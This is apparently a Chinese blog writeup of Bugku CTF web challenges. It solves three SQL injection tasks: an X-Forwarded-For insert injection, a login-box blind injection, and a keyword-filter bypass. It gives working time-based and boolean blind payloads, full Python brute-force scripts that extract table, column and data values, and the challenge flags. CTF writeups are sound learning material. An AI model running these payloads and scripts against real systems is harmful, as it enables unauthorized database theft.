---
layout: post
title: "Bugku writeup3"
date: 2018-03-17 18：40
categories: jekyll update
---

# Web
## INSERT INTO注入
&emsp;&emsp;题目描述：
```php
function getIp(){
$ip = '';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
$ip = $_SERVER['REMOTE_ADDR'];
}
$ip_arr = explode(',', $ip);
return $ip_arr[0];
}

$ip = getIp();
echo 'your ip is :'.$ip;
$sql="insert into client_ip (ip) values ('$ip')";
mysql_query($sql);
```
&emsp;&emsp;可以看到，这是`X-Forwarded-For`的注入，而且过滤了逗号`,`。在过滤了逗号的情况下，我们就不能使用`if`语句了，在mysql中与`if`有相同功效的就是：
```
select case when xxx then xxx else xxx end;
```
&emsp;&emsp;而且由于逗号`,`被过滤，我们就不能使用`substr、substring`了，但我们可以使用：`from 1 for 1`，所以最终我们的payload如下：
```
127.0.0.1'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))-- +
```
&emsp;&emsp;相应的python代码为：
```python
# -*- coding:utf-8 -*-
import requests
import sys
# 基于时间的盲注，过滤了逗号 ,
sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else 0 end))-- +"
url = 'http://120.24.86.145:8002/web15/'
flag = ''
for i in range(1, 40):
    print('正在猜测：', str(i))
    for ch in range(32, 129):
        if ch == 128:
            sys.exit(0)
        sqli = sql.format(i, chr(ch))
        # print(sqli)
        header = {
            'X-Forwarded-For': sqli
        }
        try:
            html = requests.get(url, headers=header, timeout=3)
        except:
            flag += chr(ch)
            print(flag)
            break
```
&emsp;&emsp;跑出flag：flag{cdbf14c9551d5be5612f7bb5d2867853}

## 这是一个神奇的登陆框
&emsp;&emsp;打开网站后进行抓包，进过测试后发现是`基于时间的盲注`，POC:`aaa" or sleep(5) -- +`。所以写个脚本跑一下：
```python
# -*- coding:utf-8 -*-
import requests

'''
这篇POC: aaa" or sleep(5) -- +
源于Bugku：http://120.24.86.145:9001/sql/
场景：登陆框基于时间的盲注
'''
url = 'http://120.24.86.145:9001/sql/'

def fuzz(sql, test, pos1, pos2, tmp):
    left = 32
    right = 127
    while True:
        mid = (left + right) // 2
        print('正在测试字符：' + str(mid) + ' ----> ' +  chr(mid))
        test3 = test.format(pos1-1, pos2, mid)
        params = {
            'admin_name': 'admin',
            'admin_passwd': test3,
            'submit': 'GO+GO+GO'
        }
        try:
            html = requests.post(url, params, timeout=3)
        except:
            tmp += chr(mid)
            return tmp

        sqli = sql.format(pos1-1, pos2, mid)
        params = {
            'admin_name': 'admin',
            'admin_passwd': sqli,
            'submit': 'GO+GO+GO'
        }
        try:
            html = requests.post(url, params, timeout=3)
            right = mid
        except:
            left = mid

# database = ''
# sql = "1\" or if(ascii(substr(database(),{0},1))>{1},sleep(5),0) -- +"
# test = "1\" or if(ascii(substr(database(),{0},1))={1},sleep(5),0) -- +"
# for pos in range(1, 50):
#     # 测试length(database())，一旦超过长度则不用再执行。
#     is_end = sql.format(pos, 1)
#     params = {
#         'admin_name': 'admin',
#         'admin_passwd': is_end,
#         'submit': 'GO+GO+GO'
#         }
#     try:
#         html = requests.post(url, params, timeout=3)
#         print('======================')
#         print('[*]database: ', database)
#         print('======================\n')
#         break
#     except:
#         pass
#
#     left = 32
#     right = 127
#     while True:
#         mid = (left + right) // 2
#         # print('正在测试字符：', str(mid))
#         test3 = test.format(pos, mid)
#         params = {
#             'admin_name': 'admin',
#             'admin_passwd': test3,
#             'submit': 'GO+GO+GO'
#         }
#         try:
#             html = requests.post(url, params, timeout=3)
#         except:
#             database += chr(mid)
#             print('[+]database: ', database)
#             break
#
#         sqli = sql.format(pos, mid)
#         params = {
#             'admin_name': 'admin',
#             'admin_passwd': sqli,
#             'submit': 'GO+GO+GO'
#         }
#         try:
#             html = requests.post(url, params, timeout=3)
#             right = mid
#         except:
#             left = mid

tables_name = {}
sql = "1\" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)))>{2},sleep(5),0) -- +"
test = "1\" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)))={2},sleep(5),0) -- +"
for table_num in range(1, 20):
    sqli = sql.format(table_num - 1, 1, 1)
    params = {
        'admin_name': 'admin',
        'admin_passwd': sqli,
        'submit': 'GO+GO+GO'
    }
    try:
        html = requests.post(url, params, timeout=3)
        print('[*]已无其他表！')
        break
    except:
        print('[+]正在爆破表', str(table_num))
    table = ''
    for str_num in range(1, 50):
        # 测试length(database())，一旦超过长度则不用再执行。
        test2 = sql.format(table_num - 1, str_num, 1)
        params = {
            'admin_name': 'admin',
            'admin_passwd': test2,
            'submit': 'GO+GO+GO'
        }
        try:
            html = requests.post(url, params, timeout=3)
            print('======================')
            print('[*]table: ', table)
            tables_name[table_num] = table
            print('======================\n')
            break
        except:
            pass

        table = fuzz(sql, test, table_num, str_num, table)
        print('[+]table: ', table)

print('******************')
for key in tables_name:
    print('[*]table' + str(key) + ': ' + tables_name[key])
print('******************\n')


tb = int(input('>请选择需要爆破的表(数字)：'))
# for tb in tables_name:
sql = "1\" or if((ascii(substr((select column_name from information_schema.columns where table_name='" + tables_name[tb]+ "' limit {0},1),{1},1)))>{2},sleep(5),0) -- +"
test = "1\" or if((ascii(substr((select column_name from information_schema.columns where table_name='" + tables_name[tb]+ "' limit {0},1),{1},1)))={2},sleep(5),0) -- +"
colunms_name = {}
for column_num in range(1, 20):
    sqli = sql.format(column_num - 1, 1, 1)
    params = {
        'admin_name': 'admin',
        'admin_passwd': sqli,
        'submit': 'GO+GO+GO'
    }
    try:
        html = requests.post(url, params, timeout=3)
        print('[*]已无其他字段！')
        break
    except:
        print('[+]正在爆破字段', str(column_num))
        column = ''
    for str_num in range(1, 50):
        # 测试length(database())，一旦超过长度则不用再执行。
        test2 = sql.format(column_num - 1, str_num, 1)
        params = {
            'admin_name': 'admin',
            'admin_passwd': test2,
            'submit': 'GO+GO+GO'
        }
        try:
            html = requests.post(url, params, timeout=3)
            print('======================')
            print('[*]column: ', column)
            colunms_name[column_num] = column
            print('======================\n')
            break
        except:
            pass

        column = fuzz(sql, test, column_num, str_num, column)
        print('[+]column: ', column)

print('******************')
for key in colunms_name:
    print('[*]column' + str(key) + ': ' + colunms_name[key])
print('******************\n')


cl = int(input('>请选择需要爆破的字段(数字)：'))
sql = "1\" or if((ascii(substr(( select " + colunms_name[cl] + " from " + tables_name[tb]+ " limit {0},1),{1},1)))>{2},sleep(5),0) -- +"
test = "1\" or if((ascii(substr(( select " + colunms_name[cl] + " from " + tables_name[tb]+ " limit {0},1),{1},1)))={2},sleep(5),0) -- +"
key = []
for num in range(1, 20):
    sqli = sql.format(num - 1, 1, 1)
    params = {
        'admin_name': 'admin',
        'admin_passwd': sqli,
        'submit': 'GO+GO+GO'
    }
    try:
        html = requests.post(url, params, timeout=3)
        print('[*]已无其他数据！')
        break
    except:
        print('[+]正在爆破数据', str(num))
        tmp_key = ''
    for str_num in range(1, 50):
        # 测试length(database())，一旦超过长度则不用再执行。
        test2 = sql.format(num - 1, str_num, 1)
        params = {
            'admin_name': 'admin',
            'admin_passwd': test2,
            'submit': 'GO+GO+GO'
        }
        try:
            html = requests.post(url, params, timeout=3)
            print('======================')
            print('[*]column: ', tmp_key)
            key.append(tmp_key)
            print('======================\n')
            break
        except:
            pass

        tmp_key = fuzz(sql, test, num, str_num, tmp_key)
        print('[+]key: ', tmp_key)

print('******************')
for tt in key:
    print('[*]key: ' + tt)
print('******************\n')
```

## 多次
&emsp;&emsp;打开网页后在`?id=1`后面加个`'`号，发现错误，然后再添加一个`'`，发现可以闭合。
<div align="center">
    <img src="/images/posts/bugku/51.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/52.png" >  
</div>
&emsp;&emsp;然后测试了一下，发现`and or &&`被过滤掉了，但`||`和位注入`| ^`没有被过滤。当使用`?id=0' || 1=2 -- +`时是返回错误，而`?id=0' || 1=1 -- +`返回了正确，所以这里存在注入。这里值得注意的是，我使用`id=0`而不是`id=1`等非`0`值，这是因为任何大于`0`的数进行`||`都会返回`真`。
<div align="center">
    <img src="/images/posts/bugku/53.png" width="50%" />  
</div>
<div align="center">
    <img src="/images/posts/bugku/54.png" width="50%" />  
</div>
&emsp;&emsp;这里还有一种判断是否存在注入的方式就是使用`异或`进行注入，如：`?id=0' ^ (1=2) ^ '`。
<div align="center">
    <img src="/images/posts/bugku/57.png" width="80%" />  
</div>
<div align="center">
    <img src="/images/posts/bugku/58.png" width="80%" />  
</div>
&emsp;&emsp;因为在使用`and`的时候发现是返回了错误，所以猜测后台过滤了一些字符，所以可以使用`?id=0' || length('and')=0 -- +`检查一下过滤了的函数，如：
<div align="center">
    <img src="/images/posts/bugku/55.png" width="50%" />  
</div>
&emsp;&emsp;进过一番测试后可以发现是一次替换的方法进行过滤的，因为可以看到当双写了以后它返回的长度是原来字符的长度。如：`0' || length('aandnd')=3 -- +`返回真。
<div align="center">
    <img src="/images/posts/bugku/56.png" width="70%" />  
</div>
&emsp;&emsp;然后我们检查下字段数，构造payload：`?id=1' oorrder by 2 -- +`，可以发现字段数为`2`。
<div align="center">
    <img src="/images/posts/bugku/59.png" width="80%" />  
</div>
&emsp;&emsp;然后再看显位，构造payload：`?id=-1' uniounionn seleselectct 1,2 -- +`。
<div align="center">
    <img src="/images/posts/bugku/60.png" width="80%" />  
</div>
&emsp;&emsp;获得表名：`ununionion seleselectct 1,table_name from infoorrmation_schema.tables where table_schema=database() limit 0,1-- +`
<div align="center">
    <img src="/images/posts/bugku/61.png" height="60%" />  
</div>
<div align="center">
    <img src="/images/posts/bugku/62.png" height="60%" />  
</div>
&emsp;&emsp;可以得到表：`flag1、hint`，两张表。
&emsp;&emsp;然后我们读flag1的字段：`ununionion seleselectct 1,column_name from infoorrmation_schema.columns where table_name=0x666c616731 limit 0,1-- +`
<div align="center">
    <img src="/images/posts/bugku/63.png" height="60%" />  
</div>
&emsp;&emsp;然后我们能得到两列：`flag1、address`。然后查询flag：`ununionion seleselectct 1,flag1 from flag1 -- +`
<div align="center">
    <img src="/images/posts/bugku/64.png" height="60%" />  
</div>
&emsp;&emsp;我们得到一串字符拿去提交后却发现并不是正确答案，所以我们再看一下`address`是什么。
<div align="center">
    <img src="/images/posts/bugku/65.png" height="50%" />  
</div>
&emsp;&emsp;这里我们得到了下一关的地址。打开后页面如下：
<div align="center">
    <img src="/images/posts/bugku/66.png" />  
</div>
&emsp;&emsp;然后我们再使用上面的套路进行`探测`，最后我们能发现`双写`已经不能绕过了，但是却没有过滤`if left benchmark select from`函数，所以，我们可以使用`基于时间的盲注`进行注入。payload：
```
?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='a', benchmark(7000000,MD5(14545)), 0)  %23
```
&emsp;&emsp;剩下的爆字段跟值就不一一写了，这里直接写了个脚本：
```python
# -*- coding:utf-8 -*-
from time import sleep
import requests
url = "http://120.24.86.145:9004/Once_More.php?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0})='{1}', benchmark(7000000,MD5(14545)), 0)  %23"
# url = "http://120.24.86.145:9004/Once_More.php?id=1' and if(left((select column_name from information_schema.columns where table_name=0x666c616732 limit 0,1),{0})='{1}', benchmark(7000000,MD5(14545)), 0)  %23"
# url = "http://120.24.86.145:9004/Once_More.php?id=1' and if(left((select flag2 from flag2),{0})='{1}', benchmark(40000000,MD5(14545)), 0)  %23"
database = ''

for i in range(28, 50):
    for j in range(32, 128):

        tmp = database + chr(j)
        print('正在尝试：', tmp)
        urli = url.format(i, tmp)
        # print(urli)
        try:
            html = requests.get(urli, timeout=3)
        except:
            database += chr(j)
            print('[+]column: ', database)
            break

print(database)
```
&emsp;&emsp;只要把payload一换就可以使用，不过可能需要多次执行。最终flag：`flag{bugku-sql_6s-2i-4t-bug}`，这里要说的就是`left`在比较的时候是不区分大小写的，所以一般flag要么大写要么小写，而这道题原本的flag把`bugku`中的`b`弄成了大写`B`，所以一开始提交答案不对，后来经过跟管理员联系后，管理员就把flag都改成小写了。

&emsp;&emsp;这里的另一种解法就是使用`locate()`进行`bool型`注入，payload：`id=1' and (select LOCATE('a',(select flag2 from flag2)))=1 -- +`，这里需要变的就是`locate()`的`第一个`参数，后面的`1`不要变，因为它返回的是`第一个字符串参数`出现在`第二个字符串参数`中的位置，我们把它置为`1`就是希望从头开始爆破。脚本如下：
```python
# -*- coding:utf-8 -*-
import requests
url = "http://120.24.86.145:9004/Once_More.php?id=1' and (select LOCATE('{}',(select flag2 from flag2)))=1 -- +"
database = ''

for i in range(1, 50):
    for j in range(32, 128):
        tmp = database + chr(j)
        print('正在尝试：', tmp)
        urli = url.format(tmp)
        html = requests.get(urli)
        if 'Hello' in html.text:
            database += chr(j)
            print('[+]key: ', database)
            break
```


